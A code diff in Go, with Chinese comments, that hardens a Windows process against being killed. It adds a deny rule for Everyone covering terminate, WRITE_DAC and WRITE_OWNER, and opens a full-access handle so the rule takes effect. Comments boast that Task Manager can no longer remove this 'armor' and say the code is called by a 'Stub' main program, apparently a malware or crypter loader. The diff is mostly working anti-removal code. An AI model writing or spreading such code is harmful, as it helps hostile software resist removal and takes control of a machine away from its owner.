@@ -9,6 +9,8 @@ import (
 // --- Windows API 常量与结构体精确对齐定义 ---
 const (
 	PROCESS_TERMINATE           = 0x0001
+	WRITE_DAC                   = 0x00040000 // 修改安全描述符权限
+	WRITE_OWNER                 = 0x00080000 // 修改所有者权限
 	DACL_SECURITY_INFORMATION   = 0x00000004
 	SE_KERNEL_OBJECT            = 6 // SE_OBJECT_TYPE
 	DENY_ACCESS                 = 3 // ACCESS_MODE
@@ -16,6 +18,7 @@ const (
 	TRUSTEE_IS_SID              = 0
 	TRUSTEE_IS_WELL_KNOWN_GROUP = 5
 	ERROR_SUCCESS               = 0
+	PROCESS_ALL_ACCESS          = 0x1FFFFF
 )
 
 // TRUSTEE_W 结构体
@@ -42,9 +45,12 @@ var (
 	procSetEntriesInAclW         = advapi32.NewProc("SetEntriesInAclW")
 	procAllocateAndInitializeSid = advapi32.NewProc("AllocateAndInitializeSid")
 	procFreeSid                  = advapi32.NewProc("FreeSid")
+
+	kernel32                     = syscall.NewLazyDLL("kernel32.dll")
+	procOpenProcess              = kernel32.NewProc("OpenProcess")
 )
 
-// ProtectProcessByHandle 🌟新增：为指定的任意进程句柄剥夺被结束的权限
+// ProtectProcessByHandle 为指定的任意进程句柄剥夺被结束和修改权限的资格
 func ProtectProcessByHandle(handle syscall.Handle) {
 	var pOldDacl uintptr
 	var pSD uintptr
@@ -78,9 +84,11 @@ func ProtectProcessByHandle(handle syscall.Handle) {
 	}
 	defer procFreeSid.Call(pEveryoneSid)
 
-	// 3. 构造显式访问规则 (拒绝结束进程权限)
+	// 3. 构造显式访问规则
 	var ea EXPLICIT_ACCESS_W
-	ea.grfAccessPermissions = PROCESS_TERMINATE
+	// 🌟 终极修复：同时剥夺 "结束进程"、"修改安全权限"、"修改所有者" 的权限
+	// Win11 任务管理器将彻底失去扒掉这层护甲的能力
+	ea.grfAccessPermissions = PROCESS_TERMINATE | WRITE_DAC | WRITE_OWNER
 	ea.grfAccessMode = DENY_ACCESS
 	ea.grfInheritance = NO_INHERITANCE
 	ea.Trustee.TrusteeForm = TRUSTEE_IS_SID
@@ -110,8 +118,14 @@ func ProtectProcessByHandle(handle syscall.Handle) {
 
 // ProtectProcess 剥夺系统强制结束当前父进程的权限
 func ProtectProcess() {
-	handle, _ := syscall.GetCurrentProcess()
-	ProtectProcessByHandle(handle)
+	// 🌟 修复：不再使用会静默失效的伪句柄 GetCurrentProcess()，
+	// 而是通过 PID 获取具备完整权限的真实句柄进行操作
+	pid := syscall.Getpid()
+	handle, _, _ := procOpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
+	if handle != 0 {
+		ProtectProcessByHandle(syscall.Handle(handle))
+		syscall.CloseHandle(syscall.Handle(handle))
+	}
 }
 
 // EnableProtection 一键开启全局防御 (供 Stub 主程序调用)
